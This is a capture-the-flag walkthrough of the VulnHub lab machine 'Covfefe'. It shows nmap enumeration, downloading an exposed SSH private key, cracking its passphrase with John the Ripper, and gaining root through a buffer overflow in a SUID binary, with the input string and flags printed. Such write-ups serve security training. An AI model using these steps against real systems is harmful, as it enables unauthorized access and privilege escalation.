---
title: Covfefe
category: Vulnhub
---

## Enumeration

- Started enumerating by running NMAP by using default parameters

```plaintext
└─$ nmap -sC -sV -oA quick 192.168.119.128
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 17:40 -03
Nmap scan report for 192.168.112.10
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:6a:10:e0:fb:63:22:be:09:96:0b:71:6a:60:ad:1a (RSA)
|   256 ac:2c:11:1e:e2:d6:26:ea:58:c4:3e:2d:3e:1e:dd:96 (ECDSA)
|_  256 13:b3:db:c5:af:62:c2:b1:60:7d:2f:48:ef:c3:13:fc (ED25519)
80/tcp    open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
| http-robots.txt: 3 disallowed entries 
|_/.bashrc /.profile /taxes
|_http-server-header: Werkzeug/0.11.15 Python/3.5.3
|_http-title: 404 Not Found
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.12 seconds
```

### 80/TCP

- Checking this Nginx page, noticed that seems to be the default website. Nothing to do here :)

### 31337/TCP

- When accessing this app on 31337 port, also after noticing that this webserver is very uncommon ( Werkzeug httpd) got a "Not Found" page but when I have started the enumeration I have found the following data on robots.txt

```plaintext
User-agent: *
Disallow: /.bashrc
Disallow: /.profile
Disallow: /taxes
```

- Browsing to the **/taxes** page, got a message saying that my flag is somewhere else...

- The entries **.bashrc** and **.profile** shows that this page might be published from an user's home profile. It's very likely that this user has id_rsa keys. Browsing to this directory they were found and downloaded to our box.

- Checking the **id_rsa.pub** file, noticed that the user for this credential can be **simon@covfefe** and after comparing both this file and **authorized_keys**, noticed that they're identical. The only problem with this RSA key is that is encrypted, identified after looking for the attribute **ENCRYPTED** on its contents, requiring us to look for a passphrase in order to be able to use it.

```plaintext
└─$ cat id_rsa.pub             
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzG6cWl499ZGW0PV+tRaOLguT8+lso8zbSLCzgiBYkX/xnoZx0fneSfi93gdh4ynVjs2sgZ2HaRWA05EGR7e3IetSP53NTxk5QrLHEGZQFLId3QMMi74ebGBpPkKg/QzwRxCrKgqL1b2+EYz68Y9InRAZoq8wYTLdoUVa2wOiJv0PfrlQ4e9nh29J7yPgXmVAsy5ZvmpBp5FL76y1lUblGUuftCfddh2IahevizLlVipuSQGFqRZOdA5xnxbsNO4QbFUhjIlA5RrAs814LuA9t2CiAzHXxjsVW8/R/eD8K22TO7XEQscQjaSl/R4Cr1kNtUwCljpmpjt/Q4DJmExOR simon@covfefe
└─$ diff -s id_rsa.pub authorized_keys                                                               
Files id_rsa.pub and authorized_keys are identical
└─$ cat id_rsa | grep ENCRYPTED
Proc-Type: 4,ENCRYPTED
```

- Before start digging for this passphrase, let's first try to crack it using John. To do it we need first use **ssh2john** to create a hash file from the encrypted content and then brute forced it using a dictionary, in this case **rockyou.txt** which was a very good idea once it has returned the passphrase we're needing to logon to the box, which is **starwars**.

```plaintext
└─$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
└─$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
starwars         (/dcruz/vulnhub/covfefe/loot/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:10 DONE (2020-09-05 17:58) 0.09980g/s 1431Kp/s 1431Kc/s 1431KC/sa6_123..*7¡Vamos!
Session completed

└─$ /usr/sbin/john --show id_rsa.hash 
/dcruz/vulnhub/covfefe/loot/id_rsa:starwars

1 password hash cracked, 0 left
```

- After connecting to the box using the obtained credentials was able to get the **local.txt** flag on user's home directory:

```plaintext
simon@covfefe:~$ cat local.txt
d695ee2066190bdab0cf22758d1eeb39
```

## Privilege Escalation

- Checking other interesting things on user's home directory there was also a **.bash_history** file, which is not forwarded to /dev/null and has an interesting entry for an executable called **read_message**. This binary has the SUID bit set and could probably allow us to escalate privilege.

```plaintext
simon@covfefe:~$ cat .bash_history 
read_message
exit
date | md5sum | awk '{print $q}'
date | md5sum > local.txt
cat local.txt 
nano local.txt 
ls -la
cat .bash_history 
exit
simon@covfefe:~$ whereis read_message
read_message: /usr/local/bin/read_message
simon@covfefe:~$ ls -la /usr/local/bin/read_message 
-rwsr-xr-x 1 root staff 7608 Jul  2  2017 /usr/local/bin/read_message
```
  
- Running read_message by the first time, it asks for our name and prints it as stdout saying that we're not allowed to see the message, but when I have tried with Simon, that is the user we have access to, the proper message is displayed
  
```plaintext
simon@covfefe:~$ read_message
What is your name?
test
Sorry test, you're not Simon! The Internet Police have been informed of this violation.
simon@covfefe:~$ read_message 
What is your name?
Simon
Hello Simon! Here is your message:

Hi Simon, I hope you like our private messaging system.

I'm really happy with how it worked out!

If you're interested in how it works, I've left a copy of the source code in my home directory.

- Charlie Root
```

- Now let's take a look at the source code of this binary to see if is there something interesting. As this is Charlie Root, we've been able to see **read_message.c** file under /root path. Below are it's contents:

```c
// cat read_message.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// You're getting close! Here's another flag:
// flag2{use_the_source_luke}

int main(int argc, char *argv[]) {
  char program[] = "/usr/local/sbin/message";
    char buf[20];
    char authorized[] = "Simon";

    printf("What is your name?\n");
    gets(buf);
    
    // Only compare first five chars to save precious cycles:
    if (!strncmp(authorized, buf, 5)) {
        printf("Hello %s! Here is your message:\n\n", buf);
        // This is safe as the user can't mess with the binary location:
        execve(program, NULL, NULL);
    } else {
        printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
        exit(EXIT_FAILURE);
    }

}
```

- In the source code we're able to see that the app is hardcoded to only allow Simon to use it but also that the input for the username has only 20 chars long. This might lead to a buffer overflow, once we might  change the previous declared variable, in this case **program** which is below in the stack pile. Also the remote code execution will this happen because the program calls the program using execve() function, otherwise we wouldn't be able to use this binary for privesc.

- After some attempts, I've found that the string **SimonAAAAAAAAAAAAAAA/bin/sh** is enough to cause the Buffer Overflow and also return an elevated prompt.

  - It has to start with **Simon**, otherwise we won't get to code execution phase
  - It has to end with **/bin/sh** in order to get an interactive prompt. If you try the same using **/bin/bash** you won't succeed once bash contains protections against privilege escalation.
  - In between I have started adding the character **A** until I was able to get arbitrary code execution

```plaintext
  simon@covfefe:~$ read_message
  What is your name?
  SimonAAAAAAAAAAAAAAA/bin/sh
  Hello SimonAAAAAAAAAAAAAAA/bin/sh! Here is your message:

  # cd /root
  # cat flag.txt
  Your flag is in another file...
  # dir
flag.txt  proof.txt  read_message.c
  # cat proof.txt
  386f50fde90ccb48cddaa052cb7d47ed
```

## Appendix

- When this box was first released, the flags were different and also there is other flags in the initial one, as you might have noticed when we were reading the source code for read_message.
- Below all the flags for the initial version on VulnHub:
  - After finding the  robots.txt, there's an entry on **/taxes** page. This would leak the first flag below instead of the displayed message:

```plaintext
Good job! Here is a flag: flag1{make_america_great_again}
```

- The second flag, present on read_message.c source code:

```plaintext
flag2{use_the_source_luke}
```

- Original root flag:

```plaintext
flag3{das_bof_meister}
```
